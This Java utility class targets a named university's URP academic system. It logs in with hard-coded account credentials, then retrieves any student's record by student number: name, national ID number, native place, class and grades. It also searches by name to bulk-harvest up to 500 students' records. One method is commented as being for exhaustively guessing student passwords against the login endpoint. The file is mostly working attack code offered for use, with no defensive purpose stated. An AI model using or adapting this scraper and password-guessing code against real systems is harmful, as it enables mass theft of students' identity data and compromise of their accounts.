package me.hupeng.homeworkweb.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 * @author HUPENG FORM IMUDGES
 * @version 2.0.0
 * @since jdk1.7
 * Date 2016.01.19
 * URP教务系统通用类
 * */

public class JwxtUtil {
	/**
	 * 配置参数
	 * HOST 教务系统主机IP 形如jwxt.xxx.edu.cn 或者 111.123.123
	 * ZJH MM 用于获取cookie的用户名密码
	 * */
	final private String HOST = "jwxt.imu.edu.cn";
	final private String ZJH = "0141125700";
	final private String MM = "0141125700";
	
	/**
	 * 学号 和 密码
	 * */
	private String stuNum;
	private String password;
	private String studentAllInfo;
	
	public String getStuNum() {
		return stuNum;
	}
	public void setStuNum(String stuNum) throws Exception {
		this.stuNum = stuNum;
		studentAllInfo = null;
	}
	public String getPassword() {
		return password;
	}
	public void setPassword(String password) {
		this.password = password;
	}
	
	/**
	 * 内部静态类模块
	 * 学生信息类
	 * */
	public static class StudentInfo{
		/**
		 * 姓名
		 * 性别
		 * 籍贯
		 * 身份证号码
		 * 专业
		 * 班级
		 * 考试成绩
		 * */
		private String name;
		private String sex;
		private String nativePlace;
		private String idCardNum;
		private String profession;
		private String className;
		private Map<String, String>testScores;
		public String getName() {
			return name;
		}
		public void setName(String name) {
			this.name = name;
		}
		public String getSex() {
			return sex;
		}
		public void setSex(String sex) {
			this.sex = sex;
		}
		public String getNativePlace() {
			return nativePlace;
		}
		public void setNativePlace(String nativePlace) {
			this.nativePlace = nativePlace;
		}
		public String getIdCardNum() {
			return idCardNum;
		}
		public void setIdCardNum(String idCardNum) {
			this.idCardNum = idCardNum;
		}
		public String getProfession() {
			return profession;
		}
		public void setProfession(String profession) {
			this.profession = profession;
		}
		public String getClassName() {
			return className;
		}
		public void setClassName(String className) {
			this.className = className;
		}
		public Map<String, String> getTestScores() {
			return testScores;
		}
		public void setTestScores(Map<String, String> testScores) {
			this.testScores = testScores;
		}
	}
	
	
	/**
	 * 静态内部类模块
	 * 成绩信息类
	 * */
	private static class CourseModel{
		private String course;
		private int point;
		private int grade;
		private String date;
		public String getCourse() {
			return course;
		}
		public void setCourse(String course) {
			this.course = course;
		}
		public int getPoint() {
			return point;
		}
		public void setPoint(int point) {
			this.point = point;
		}
		public int getGrade() {
			return grade;
		}
		public void setGrade(int grade) {
			this.grade = grade;
		}
		public String getDate() {
			return date;
		}
		public void setDate(String date) {
			this.date = date;
		}
	}
	
	/**
	 * 功能模块
	 * Http请求类
	 * */
	static class HttpRequest {
		private static String cookie = "";
		
	    public static String getCookie() {
			return cookie;
		}

		public static void setCookie(String cookie) {
			HttpRequest.cookie = cookie;
		}

		/**
	     * 向指定URL发送GET方法的请求
	     * 
	     * @param url
	     *            发送请求的URL
	     * @param param
	     *            请求参数，请求参数应该是 name1=value1&name2=value2 的形式。
	     * @return URL 所代表远程资源的响应结果
	     */
	    public static String sendGet(String url, String param) {
	    	//System.out.println("get");
	        String result = "";
	        BufferedReader in = null;
	        
	        try {
	            String urlNameString = url + "?" + param;
	            URL realUrl = new URL(urlNameString);
	            // 打开和URL之间的连接
	            URLConnection connection = realUrl.openConnection();
	            // 设置通用的请求属性
	            connection.setRequestProperty("accept", "*/*");
	            connection.setRequestProperty("connection", "Keep-Alive");
	            connection.setRequestProperty("user-agent",
	                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
	            connection.setRequestProperty("Cookie", "JSESSIONID=" + cookie);
	            // 建立实际的连接
	            connection.connect();
	            // 获取所有响应头字段
	            Map<String, List<String>> map = connection.getHeaderFields();
	            // 遍历所有的响应头字段
//	            for (String key : map.keySet()) {
//	                System.out.println(key + "--->" + map.get(key));
//	            }
	            // 定义 BufferedReader输入流来读取URL的响应
	            in = new BufferedReader(new InputStreamReader(
	                    connection.getInputStream(),"gbk"));
	            String line;
	            while ((line = in.readLine()) != null) {
	                result += line;
	            }
	            if (result.contains("请重新登录")) {
					cookie = new JwxtUtil().getCookie();
					//System.out.println(cookie);
					//return HttpRequest.sendGet(url, param);
				}
	        } catch (Exception e) {
	            System.out.println("发送GET请求出现异常！" + e);
	            e.printStackTrace();
	        }
	        // 使用finally块来关闭输入流
	        finally {
	            try {
	                if (in != null) {
	                    in.close();
	                }
	            } catch (Exception e2) {
	                e2.printStackTrace();
	            }
	        }
	        return result;
	    }

	    /**
	     * 向指定 URL 发送POST方法的请求
	     * 
	     * @param url
	     *            发送请求的 URL
	     * @param param
	     *            请求参数，请求参数应该是 name1=value1&name2=value2 的形式。
	     * @return 所代表远程资源的响应结果
	     */
	    public static String sendPost(String url, String param) {
	    	//System.out.println("post");
	        PrintWriter out = null;
	        BufferedReader in = null;
	        String result = "";
	        try {
	            URL realUrl = new URL(url);
	            // 打开和URL之间的连接
	            URLConnection conn = realUrl.openConnection();
	            // 设置通用的请求属性
	            conn.setRequestProperty("accept", "*/*");
	            conn.setRequestProperty("connection", "Keep-Alive");
	            conn.setRequestProperty("user-agent",
	                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
	            conn.setRequestProperty("Cookie", "JSESSIONID=" + cookie);
	            // 发送POST请求必须设置如下两行
	            conn.setDoOutput(true);
	            conn.setDoInput(true);
	            // 获取URLConnection对象对应的输出流
	            out = new PrintWriter(conn.getOutputStream());
	            // 发送请求参数
	            out.print(param);
	            // flush输出流的缓冲
	            out.flush();
	            // 定义BufferedReader输入流来读取URL的响应
	            in = new BufferedReader(
	                    new InputStreamReader(conn.getInputStream(),"gbk"));
	            String line;
	            while ((line = in.readLine()) != null) {
	                result += line;
	            }
	            if (result.contains("500 Servlet Exception")) {
	            	cookie = new JwxtUtil().getCookie();
					//System.out.println(cookie);
					//return HttpRequest.sendPost(url, param);
				}
	        } catch (Exception e) {
	            System.out.println("发送 POST 请求出现异常！"+e);
	            e.printStackTrace();
	        }
	        //使用finally块来关闭输出流、输入流
	        finally{
	            try{
	                if(out!=null){
	                    out.close();
	                }
	                if(in!=null){
	                    in.close();
	                }
	            }
	            catch(IOException ex){
	                ex.printStackTrace();
	            }
	        }
	        return result;
	    }    
	}
	
	
	/**
	 * 功能模块
	 * 配置载入模块
	 * @throws Exception 
	 * 当配置文件或者配置信息没找时将抛出异常
	 * */
	
	private String getConfigInfo(String param) throws Exception {
		String paramString = null;
		if (param.equals("host")) {
			return HOST;
		}
		else {
			if (param.equals("zjh")) {
				return ZJH;
			}
			else {
				if (param.equals("mm")) {
					return MM;
				}
			}
		}
		return paramString;
	}
	
	/**
	 * 功能模块
	 * 获取有效信息
	 * @throws Exception 
	 * 此处不对传过来的异常进行处理
	 * 注意请保证传过来的 host zjh mm 三个参数的有效性
	 * */
	private String getCookie() throws Exception {
		String set_cookiesString = null;
		String url = "http://" + getConfigInfo("host")
				+ "/loginAction.do";
		String param = "zjh=" + getConfigInfo("zjh") + "&mm="
				+ getConfigInfo("mm");
		BufferedReader in = null;
		try {
			String urlNameString = url + "?" + param;
			URL realUrl = new URL(urlNameString);
			// 打开和URL之间的连接
			URLConnection connection = realUrl.openConnection();
			// 设置通用的请求属性
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// connection.setRequestProperty("Cookie",
			// "JSESSIONID=bfajrqHj1f0-YgGeg5a9u");
			// 建立实际的连接
			connection.connect();
			// 获取所有响应头字段
			@SuppressWarnings("unused")
			Map<String, List<String>> map = connection.getHeaderFields();
			// 遍历所有的响应头字段
			for (String key : map.keySet()) {
				// System.out.println(key + "--->" + map.get(key));
				if (key != null && key.equals("Set-Cookie")) {
					// System.out.println(map.get(key));
					set_cookiesString = map.get(key).get(0);
					// System.out.println(set_cookiesString);
				}
			}
			in = new BufferedReader(new InputStreamReader(
	                    connection.getInputStream()));
	        String line;
	        String result = "";
	        while ((line = in.readLine()) != null) {
	        	result += line;
	        }
	        if (result.contains("URP 综合教务系统 - 登录")) {
				//用户名 或者 密码不正确 抛出异常
	        	throw new Exception("用户名 或者 密码 无效");
			}
		} catch (Exception e) {
			System.out.println("发送GET请求出现异常！" + e);
			e.printStackTrace();
		}
		// 使用finally块来关闭输入流
		finally {
			try {
				if (in != null) {
					in.close();
				}
			} catch (Exception e2) {
				e2.printStackTrace();
			}
		}
		if (set_cookiesString == null) {
			return null;
		} else {
			//System.out.println(set_cookiesString);
			String cookieString = null;
			Pattern pattern = Pattern.compile("[0-9a-zA-Z_-]{11,32}");//此处匹配出SetCookie字符串
			Matcher matcher = pattern.matcher(set_cookiesString);
			if (matcher.find()) {
				cookieString = matcher.group();
			}
			return cookieString;
		}
	}
	
	/**
	 * 功能模块
	 * 验证用户 用户名 密码的 有效性,用于穷举用户密码，需要传入stuNum,password
	 * @return
	 * true: 密码正确
	 * false:密码错误
	 * */
	
	public boolean checkStuPasswd() throws Exception{
		String url = "http://" + getConfigInfo("host")
				+ "/loginAction.do";
		if (stuNum == null || password == null) {
			throw new Exception("请先设置学号和密码");
		}
		String param = "zjh=" + stuNum + "&mm="
				+ password;
		String resultString = HttpRequest.sendPost(url, param);
		if (resultString.contains("URP 综合教务系统 - 登录")) {
			return false;
		}else {
			return true;
		}
	}
	
	/**
	 * 主功能模块
	 * 获取学生信息,在这之前需要传入stuNum
	 * @return
	 * null:学号无效
	 * @throws Exception 
	 * */
	
	public JwxtUtil.StudentInfo getstudentInfo() throws Exception{
		if (getStuStatus() == false) {
			return null;
		}else {
			StudentInfo studentInfo = new StudentInfo();
			studentInfo.name = getName();
			studentInfo.sex = getSex();
			studentInfo.profession = getProfession();
			studentInfo.nativePlace = getProvince();
			studentInfo.className = getClassName();
			studentInfo.idCardNum = getIdCard();
			List<CourseModel>list = getCourseList();
			Map<String, String>map = new HashMap<>();
			for (int i = 0; i < list.size(); i++) {
				CourseModel courseModel = list.get(i);
				map.put(courseModel.getCourse(), courseModel.getGrade()+"");
			}
			studentInfo.testScores = map;
			return studentInfo;
		}
		
	}
	
	/**
	 * 得到用户的所有信息
	 * @throws Exception 
	 * */
	private String getStudentAllInfo() throws Exception{
		if (studentAllInfo == null) {
			String url=null;
			url = "http://" + getConfigInfo("host")
				+ "/setReportParams";
			String param=null;
			param = "LS_XH=" + getStuNum() + "&resultPage=http://" + getConfigInfo("host") + "/reportFiles/cj/cj_zwcjd.jsp?";
			//
			HttpRequest.setCookie(getCookie());
			this.studentAllInfo = HttpRequest.sendGet(url, param);
		}
		//System.out.println(this.studentAllInfo);
		//this.studentAllInfo = new String(this.studentAllInfo.getBytes("utf-8"), "gbk"); 
		//System.out.println(this.studentAllInfo);
		return this.studentAllInfo;
	}
	
	// 判断用户是否有效
	public boolean getStuStatus() throws Exception {
		if (getStudentAllInfo().contains(stuNum)) {
			return true;
		}
		return false;
	}

	// 得到身份证号码
	private String getIdCard() throws Exception {
		String result = getStudentAllInfo();
		String id = "";
		Pattern pattern = Pattern.compile("[0-9]{17}[0-9xX]");
		Matcher matcher = pattern.matcher(result);
		if (matcher.find()) {
			id = matcher.group();
		}
		return id;
	}

	// 得到姓名
	private String getName() throws Exception {
		String result = getStudentAllInfo();
		Pattern pattern1 = Pattern
				.compile("class=\"report1_2_1\">[^x00-xff]{2,16}</td>");
		Matcher matcher1 = pattern1.matcher(result);
		String resultString = "";
		while (matcher1.find()) {
			String tempString = matcher1.group();

			if (!tempString.contains("姓名")) {
				resultString = tempString;
				resultString = resultString.replaceFirst(
						"class=\"report1_2_1\">", "");
				resultString = resultString.replaceAll("</td>", "");
				break;
			}
		}
		return resultString;
	}

	// 得到性别
	private String getSex() throws Exception {
		String result = getStudentAllInfo();
		if (result
				.contains("<td class=\"report1_2_9\">性别</td>		<td class=\"report1_2_1\">男</td>")) {
			return "男";
		}
		if (result
				.contains("<td class=\"report1_2_9\">性别</td>		<td class=\"report1_2_1\">女</td>")) {
			return "女";
		}
		return "无法获得性别";
	}



	// 得到民族
	private String getNation() throws Exception {
		Pattern pattern1 = Pattern
				.compile("<td class=\"report1_2_1\">民族</td>		<td colSpan=2 class=\"report1_2_1\">[^x00-xff]{2,16}");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
		}
		return resultString
				.replaceAll(
						"<td class=\"report1_2_1\">民族</td>		<td colSpan=2 class=\"report1_2_1\">",
						"");
	}

	// 得到籍贯
	private String getProvince() throws Exception {
		Pattern pattern1 = Pattern
				.compile("<td class=\"report1_2_1\">籍贯</td>		<td colSpan=3 class=\"report1_2_1\">[^x00-xff]{2,16}");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
		}

		return resultString
				.replaceAll(
						"<td class=\"report1_2_1\">籍贯</td>		<td colSpan=3 class=\"report1_2_1\">",
						"");
	}

	// 得到政治面貌
	private String getChinaRank() throws Exception {
		Pattern pattern1 = Pattern
				.compile("<td colSpan=2 class=\"report1_2_1\">政治面貌</td>		<td colSpan=3 class=\"report1_2_1\">[^x00-xff]{1,16}");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
		}
		return resultString
				.replace(
						"<td colSpan=2 class=\"report1_2_1\">政治面貌</td>		<td colSpan=3 class=\"report1_2_1\">",
						"");
	}

	// 得到班级
	private String getClassName() throws Exception {

		Pattern pattern1 = Pattern
				.compile("<td class=\"report1_2_1\">班级</td>		<td colSpan=4 class=\"report1_2_1\">[^x00-xff]{1,16}[0-9]{0,3}[^x00-xff]{0,16}[0-9]{0,2}[^x00-xff]{1,16}[0-9]{0,3}[^x00-xff]{0,16}");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
			break;
		}
		return resultString
				.replace(
						"<td class=\"report1_2_1\">班级</td>		<td colSpan=4 class=\"report1_2_1\">",
						"");
	}

	// 得到专业
	private String getProfession() throws Exception {
		Pattern pattern1 = Pattern
				.compile("<td class=\"report1_2_1\">专业</td>		<td colSpan=6 class=\"report1_2_1\">[^x00-xff]{1,16}");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
			break;
		}
		return resultString
				.replace(
						"<td class=\"report1_2_1\">专业</td>		<td colSpan=6 class=\"report1_2_1\">",
						"");
	}

	// 得到各门课程的详细信息
	private List<CourseModel> getCourseList() throws Exception {
		List<CourseModel> list = new ArrayList<>();
		Pattern pattern1 = Pattern
				.compile("<td colSpan=4 class=\"report1_2_1\">[^FB00～FFFDh]{0,36}</td>		<td class=\"report1_8_5\">[0-9]{1,2}</td>		<td class=\"report1_2_1\">[0-9]{1,3}</td>		<td class=\"report1_2_1\">[^FB00～FFFDh]{0,36}</td>		<td class=\"report1_2_1\">[^FB00～FFFDh]{0,36}</td>		<td colSpan=2 class=\"report1_2_1\">[0-9/]{0,9}</td>");
		Matcher matcher1 = pattern1.matcher(getStudentAllInfo());
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
			list.add(getCourseModel(resultString));
		}
		return list;
		// return
		// resultString.replace("<td class=\"report1_2_1\">专业</td>		<td colSpan=6 class=\"report1_2_1\">",
		// "");
	}

	public CourseModel getCourseModel(String CourseInfo) {
		String[] results = new String[6];
		int i = 0;
		CourseModel courseModel = new CourseModel();
		Pattern pattern = Pattern
				.compile(">[^FB00～FFFDh]{0,16}[0-9/]{0,9}</td>");
		Matcher matcher = pattern.matcher(CourseInfo);
		String resultString = "";
		while (matcher.find()) {
			resultString = matcher.group();
			resultString = resultString.replace("</td>", "");
			resultString = resultString.replace(">", "");
			results[i++] = resultString;
		}
		courseModel.setCourse(results[0]);
		courseModel.setPoint(Integer.parseInt(results[1]));
		try {
			courseModel.setGrade(Integer.parseInt(results[2]));
		} catch (Exception e) {
			// TODO: handle exception
			courseModel.setGrade(Integer.parseInt("0"));
		}

		courseModel.setDate(results[5]);
		return courseModel;
	}
	
	/**
	 * 主功能模块
	 * 按照姓名查找
	 * @param
	 * name 姓名
	 * @throws Exception 
	 * */
	
	public List<StudentInfo>getStudentInfoListByName(String name) throws Exception{
		HttpRequest.setCookie(getCookie());
		List<String>stuNumList = new ArrayList<>();
		String url = "http://"+ getConfigInfo("host") +"/xsmdAction.do?oper=xsmd";
		String param = "xh=&xm="+URLEncoder.encode(name, "gbk")+"&zymc=&zyfxmc=&ts=500&submitButton=%B2%E9%D1%AF";
		String allStuNumInfo = HttpRequest.sendPost(url, param);
		//System.out.println(allStuNumInfo);
		Pattern pattern = Pattern
				.compile("<input  type=\"hidden\" name=\"cxkbdm\" value=\"[0-9]{10}\" />");
		Matcher matcher1 = pattern.matcher(allStuNumInfo);
		String resultString = "";
		while (matcher1.find()) {
			resultString = matcher1.group();
			resultString = resultString.replaceAll("<input  type=\"hidden\" name=\"cxkbdm\" value=\"", "");
			resultString = resultString.replaceAll("\" />", "");
			stuNumList.add(resultString);
		}
		
		List<StudentInfo>list = new ArrayList<>();
		for (int i = 0; i < stuNumList.size(); i++) {
			//System.out.println(stuNumList.get(i));
			setStuNum(stuNumList.get(i));
			list.add(getstudentInfo());
		}
		return list;
	}
}

